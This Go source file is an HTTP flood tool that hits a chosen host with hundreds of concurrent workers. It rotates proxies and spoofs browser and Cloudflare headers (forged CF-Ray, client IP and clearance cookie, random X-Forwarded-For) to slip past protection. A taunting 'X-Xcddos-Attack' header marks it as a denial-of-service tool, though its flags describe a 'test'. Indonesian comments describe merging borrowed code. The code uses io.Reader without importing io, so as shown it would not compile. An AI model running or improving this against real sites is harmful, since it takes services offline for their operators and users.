package main

import (
	"bufio"
	"crypto/tls"
	"encoding/hex"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
)

var (
	host       = flag.String("host", "127.0.0.1", "Target host")
	port       = flag.Int("port", 443, "Target port")
	path       = flag.String("path", "/", "Request path")
	query      = flag.String("query", "", "Query string appended to URL")
	method     = flag.String("method", "GET", "HTTP method: GET or POST")
	postData   = flag.String("post", "", "POST body data (used when -method=POST)")
	workers    = flag.Int("workers", 200, "Number of concurrent worker goroutines")
	batch      = flag.Int("batch", 50, "Requests fired per batch inside each worker")
	duration   = flag.Int("duration", 10, "Test duration in seconds")
	timeout    = flag.Int("timeout", 5, "Per-request timeout in seconds")
	useProxy   = flag.Bool("proxy", false, "Enable proxy rotation (loads from data/proxies.txt)")
	proxyFile  = flag.String("proxy-file", "data/proxies.txt", "Path to proxy list file")
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
	"Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
}

var acceptHeaders = []string{
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

var acceptLanguages = []string{
	"en-US,en;q=0.9",
	"en-GB,en;q=0.8,en-US;q=0.7",
	"en-US,en;q=0.5",
	"fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
	"de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
}

var secChUa = []string{
	`"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"`,
	`"Microsoft Edge";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`,
	`"Brave";v="124", "Chromium";v="124", "Not-A.Brand";v="99"`,
}

var totalRequests  int64
var failedRequests int64
var bytesSent      int64

var proxyList  []string
var proxyMu    sync.RWMutex
var proxyIndex int64

func loadProxies(filePath string) error {
	f, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("could not open proxy file: %w", err)
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		if !strings.Contains(line, "://") {
			line = "http://" + line
		}
		proxyList = append(proxyList, line)
	}
	if len(proxyList) == 0 {
		return fmt.Errorf("proxy file is empty or contains no valid entries")
	}
	return scanner.Err()
}

func nextProxy() string {
	idx := atomic.AddInt64(&proxyIndex, 1)
	proxyMu.RLock()
	p := proxyList[int(idx)%len(proxyList)]
	proxyMu.RUnlock()
	return p
}

// ========== REPLACE buildClient DENGAN LOGIC TLS DARI KODE YANG LU KASIH ==========
func buildClient() *http.Client {
	tlsCfg := &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS12,
		MaxVersion:         tls.VersionTLS13,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		},
		ServerName:         *host,
		ClientSessionCache: tls.NewLRUClientSessionCache(100),
	}

	transport := &http.Transport{
		TLSClientConfig:       tlsCfg,
		MaxIdleConns:          500,
		MaxIdleConnsPerHost:   100,
		IdleConnTimeout:       90 * time.Second,
		DisableKeepAlives:     false,
		ForceAttemptHTTP2:     true,
		ResponseHeaderTimeout: time.Duration(*timeout) * time.Second,
		DialContext: (&net.Dialer{
			Timeout:   8 * time.Second,
			KeepAlive: 30 * time.Second,
			DualStack: true,
		}).DialContext,
	}

	if *useProxy && len(proxyList) > 0 {
		proxyURL, err := url.Parse(nextProxy())
		if err == nil {
			transport.Proxy = http.ProxyURL(proxyURL)
		}
	}

	http2.ConfigureTransport(transport)
	return &http.Client{Transport: transport, Timeout: time.Duration(*timeout+2) * time.Second}
}

// ========== FUNGSI UNTUK HEADER SPOOFING (DARI KODE YANG LU KASIH) ==========
func randomHexString(n int) string {
	b := make([]byte, n/2)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func generateSpoofedHeaders() map[string]string {
	uaList := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
	}

	versions := []string{"149", "150", "148"}
	fullVersions := []string{
		`"Brave";v="149.0.0.0", "Chromium";v="149.0.0.0", "Not?A_Brand";v="24.0.0.0"`,
		`"Brave";v="150.0.0.0", "Chromium";v="150.0.0.0", "Not?A_Brand";v="24.0.0.0"`,
		`"Brave";v="148.0.0.0", "Chromium";v="148.0.0.0", "Not?A_Brand";v="24.0.0.0"`,
	}
	languages := []string{
		"id-ID,id;q=0.9,en;q=0.8",
		"en-US,en;q=0.9,id;q=0.8",
		"en-GB,en;q=0.9",
	}
	cfRayPrefixes := []string{"8a0a092ad9d940b0", "8a0a092ad9d940b1", "8a0a092ad9d940b2"}
	cfRayLocs := []string{"SIN", "JAK", "CGK", "LAX", "FRA", "LHR"}
	countries := []string{"ID", "SG", "MY", "PH", "TH", "VN", "CN", "JP", "KR", "US", "GB", "DE", "FR"}

	randIdx := rand.Intn(len(uaList))
	ver := versions[rand.Intn(len(versions))]
	fullVer := fullVersions[rand.Intn(len(fullVersions))]
	lang := languages[rand.Intn(len(languages))]
	country := countries[rand.Intn(len(countries))]
	cfRay := cfRayPrefixes[rand.Intn(len(cfRayPrefixes))] + "-" + cfRayLocs[rand.Intn(len(cfRayLocs))]

	ip := fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255)+1, rand.Intn(255), rand.Intn(255), rand.Intn(255)+1)

	headers := map[string]string{
		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
		"Accept-Encoding":           "gzip, br",
		"Accept-Language":           lang,
		"Cache-Control":             "max-age=0",
		"Connection":                "keep-alive",
		"Priority":                  "u=0, i",
		"Sec-Ch-Ua":                 fmt.Sprintf(`"Brave";v="%s", "Chromium";v="%s", "Not?A_Brand";v="24"`, ver, ver),
		"Sec-Ch-Ua-Arch":            "x86",
		"Sec-Ch-Ua-Bitness":         "64",
		"Sec-Ch-Ua-Full-Version-List": fullVer,
		"Sec-Ch-Ua-Mobile":          "?0",
		"Sec-Ch-Ua-Model":           "",
		"Sec-Ch-Ua-Platform":        "Windows",
		"Sec-Ch-Ua-Platform-Version": "15.0.0",
		"Sec-Fetch-Dest":            "document",
		"Sec-Fetch-Mode":            "navigate",
		"Sec-Fetch-Site":            "cross-site",
		"Sec-Fetch-User":            "?1",
		"Sec-Gpc":                   "1",
		"Upgrade-Insecure-Requests": "1",
		"User-Agent":                uaList[randIdx],
		"X-Forwarded-For":           ip,
		"X-Forwarded-Proto":         "https",
		"CF-Ray":                    cfRay,
		"CF-Visitor":                `{"scheme":"https"}`,
		"Cf-Connecting-Ip":          ip,
		"CF-IPCountry":              country,
		"X-Country":                 country,
		"X-Xcddos-Attack":           "}:-) Your protect is verry bad, Just go home and drink your mother's milk O_o",
		"Cookie":                    fmt.Sprintf("_cf_clearance=%s; __cf_bm=...; __cfruid=...", randomHexString(32)),
		"Origin":                    "https://" + *host,
		"Referer":                   "https://" + *host + "/",
		"X-Ssl-Id":                  fmt.Sprintf("%d-%s", time.Now().Unix(), randomHexString(20)),
	}

	return headers
}

// ========== REPLACE buildRequest PAKE LOGIC HEADER SPOOFING ==========
func buildRequest(targetURL string) *http.Request {
	m := strings.ToUpper(*method)
	var body io.Reader
	if m == "POST" && *postData != "" {
		body = strings.NewReader(*postData)
	}

	req, err := http.NewRequest(m, targetURL, body)
	if err != nil {
		return nil
	}

	// Header spoofing dari kode yang lu kasih
	headers := generateSpoofedHeaders()
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	if m == "POST" && *postData != "" {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("Content-Length", fmt.Sprintf("%d", len(*postData)))
	}

	return req
}

// ========== SEMUA KODE DIBAWAH INI TETAP ORIGINAL (GA DIUBAH) ==========

func randomPlatform(mobile bool) string {
	if mobile {
		return `"Android"`
	}
	platforms := []string{`"Windows"`, `"macOS"`, `"Linux"`}
	return platforms[rand.Intn(len(platforms))]
}

func worker(wg *sync.WaitGroup, targetURL string, stop <-chan struct{}) {
	defer wg.Done()
	client := buildClient()

	for {
		select {
		case <-stop:
			return
		default:
			var innerWG sync.WaitGroup
			for i := 0; i < *batch; i++ {
				innerWG.Add(1)
				go func() {
					defer innerWG.Done()
					req := buildRequest(targetURL)
					if req == nil {
						atomic.AddInt64(&failedRequests, 1)
						return
					}
					sent := estimateReqSize(req)
					resp, err := client.Do(req)
					if err != nil {
						atomic.AddInt64(&failedRequests, 1)
						if *useProxy && len(proxyList) > 1 {
							client = buildClient()
						}
						return
					}
					resp.Body.Close()
					atomic.AddInt64(&totalRequests, 1)
					atomic.AddInt64(&bytesSent, sent)
				}()
			}
			innerWG.Wait()
		}
	}
}

func estimateReqSize(req *http.Request) int64 {
	size := int64(len(req.Method) + len(req.URL.String()) + 12)
	for k, vs := range req.Header {
		for _, v := range vs {
			size += int64(len(k) + len(v) + 4)
		}
	}
	if *postData != "" {
		size += int64(len(*postData))
	}
	return size
}

func buildTargetURL() string {
	u := fmt.Sprintf("https://%s:%d%s", *host, *port, *path)
	if *query != "" {
		u += "?" + *query
	}
	return u
}

func formatBytes(b int64) string {
	const unit = 1024
	if b < unit {
		return fmt.Sprintf("%d B", b)
	}
	div, exp := int64(unit), 0
	for n := b / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.2f %cB", float64(b)/float64(div), "KMGTPE"[exp])
}

func main() {
	rand.Seed(time.Now().UnixNano())
	flag.Parse()

	if *useProxy {
		if err := loadProxies(*proxyFile); err != nil {
			fmt.Fprintf(os.Stderr, "[PROXY] %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("[PROXY] Loaded %d proxies from %s\n", len(proxyList), *proxyFile)
	}

	targetURL := buildTargetURL()
	fmt.Printf("[CONFIG] Target:   %s\n", targetURL)
	fmt.Printf("[CONFIG] Method:   %s\n", strings.ToUpper(*method))
	fmt.Printf("[CONFIG] Workers:  %d\n", *workers)
	fmt.Printf("[CONFIG] Batch:    %d req/batch\n", *batch)
	fmt.Printf("[CONFIG] Duration: %ds\n", *duration)
	fmt.Printf("[CONFIG] Timeout:  %ds\n", *timeout)
	if *method == "POST" && *postData != "" {
		fmt.Printf("[CONFIG] POST:     %s\n", *postData)
	}
	if *useProxy {
		fmt.Printf("[CONFIG] Proxies:  %d loaded\n", len(proxyList))
	}
	fmt.Println()

	var wg sync.WaitGroup
	stop := make(chan struct{})

	go func() {
		time.Sleep(time.Duration(*duration) * time.Second)
		close(stop)
	}()

	ticker := time.NewTicker(2 * time.Second)
	go func() {
		prev := int64(0)
		for {
			select {
			case <-stop:
				ticker.Stop()
				return
			case <-ticker.C:
				current := atomic.LoadInt64(&totalRequests)
				failed := atomic.LoadInt64(&failedRequests)
				sent := atomic.LoadInt64(&bytesSent)
				rps := (current - prev) / 2
				prev = current
				fmt.Printf("[LIVE] reqs=%d  failed=%d  rps=%d  sent=%s\n",
					current, failed, rps, formatBytes(sent))
			}
		}
	}()

	start := time.Now()
	for i := 0; i < *workers; i++ {
		wg.Add(1)
		go worker(&wg, targetURL, stop)
	}
	wg.Wait()

	elapsed := time.Since(start).Seconds()
	total := atomic.LoadInt64(&totalRequests)
	failed := atomic.LoadInt64(&failedRequests)
	sent := atomic.LoadInt64(&bytesSent)

	fmt.Println("\n--- Results ---")
	fmt.Printf("Total Requests:  %d\n", total)
	fmt.Printf("Failed Requests: %d\n", failed)
	fmt.Printf("Success Rate:    %.1f%%\n", 100*float64(total)/float64(total+failed+1))
	fmt.Printf("Requests/sec:    %.2f\n", float64(total)/elapsed)
	fmt.Printf("Total Sent:      %s\n", formatBytes(sent))
	fmt.Printf("Duration:        %.2fs\n", elapsed)
}